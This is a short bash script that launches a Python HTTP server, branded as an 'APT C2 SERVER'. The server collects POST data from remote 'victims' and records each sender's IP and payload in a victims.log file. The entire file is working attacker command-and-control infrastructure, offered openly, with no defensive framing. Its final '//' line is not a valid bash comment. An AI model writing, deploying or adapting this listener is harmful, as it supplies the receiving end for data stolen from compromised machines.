#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

C2_PORT=10000
VICTIM_DIR="$HOME/c2_server/victims"
mkdir -p "$VICTIM_DIR"

echo -e "${RED}"
echo "╔══════════════════════════════════════╗"
echo "║     💀 APT C2 SERVER v3.0           ║"
echo "║     HTTP Handler — Render Ready     ║"
echo "╚══════════════════════════════════════╝"
echo -e "${NC}"

# Start Python HTTP listener
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

VICTIM_DIR = '$VICTIM_DIR'

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8', errors='ignore')
        ip = self.client_address[0]
        print(f'[+] Data from {ip}: {data}')
        
        with open(f'{VICTIM_DIR}/victims.log', 'a') as f:
            f.write(f'{ip}: {data}\n')
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'ACK')
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'C2 ACTIVE')

port = $C2_PORT
print(f'[+] HTTP C2 Listener on port {port}')
HTTPServer(('0.0.0.0', port), C2Handler).serve_forever()
"
// force deploy Wed Jun 17 12:25:24 PKT 2026
